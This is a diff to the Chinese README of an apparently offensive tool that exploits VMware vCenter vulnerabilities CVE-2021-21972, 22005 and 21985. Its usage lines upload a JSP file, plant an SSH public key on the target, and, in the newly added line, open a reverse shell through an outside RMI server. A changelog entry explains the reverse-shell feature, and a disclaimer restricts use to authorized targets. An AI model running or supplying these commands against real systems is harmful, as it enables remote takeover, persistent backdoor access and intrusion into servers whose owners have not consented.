@@ -19,6 +19,7 @@ go build -o main.exe
 ./main.exe -u https://192.168.1.1 -m 22005 -f test.jsp
 ./main.exe -u https://192.168.1.1 -m 21972 -f test.jsp
 ./main.exe -u https://192.168.1.1 -m 21972 -f id_rsa.pub -t ssh //传公钥
+./main.exe -u https://192.168.1.1 -m 21985 -t rshell -r rmi://xx.xx.xx.xx:1099/xx
 ```
 
 #### 4.免责声明
@@ -28,3 +29,7 @@ go build -o main.exe
 在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。**请勿对非授权目标使用。**
 
 如您在使用本工具的过程中存在任何非法行为，**您需自行承担相应后果**，我们将不承担任何法律及连带责任。
+
+#### 5.更新日志
+
+针对CVE-2021-21985添加了利用rmi反弹shell的功能，前提是你要启动一个rmi服务器，例如jndi-injection-exploit
